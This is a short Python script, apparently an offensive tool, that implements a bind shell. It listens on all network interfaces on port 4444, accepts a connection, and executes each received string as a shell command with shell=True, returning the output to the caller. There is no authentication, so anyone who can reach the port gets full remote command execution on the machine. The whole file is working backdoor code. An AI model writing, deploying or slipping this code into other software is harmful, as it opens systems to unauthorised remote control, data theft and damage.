#!/usr/bin/env python3
import socket
import subprocess
import click


def run_cmd(cmd):
    output = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )
    return output.stdout + output.stderr


@click.command()
@click.option('--port', '-p', default=4444, help='Port to listen on.')
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    print(f'[*] Listening on 0.0.0.0:{port}')

    client_socket, address = s.accept()
    print(f'[*] Connection from {address}')

    while True:
        cmd_bytes = client_socket.recv(2048)
        if not cmd_bytes:
            break
        cmd = cmd_bytes.decode(errors='replace').strip()
        if cmd.lower() == 'exit':
            break
        if not cmd:
            continue
        print(f'[*] Executing: {cmd}')
        output = run_cmd(cmd)
        client_socket.sendall(output)

    client_socket.close()
    s.close()
    print('[*] Connection closed')


if __name__ == '__main__':
    main()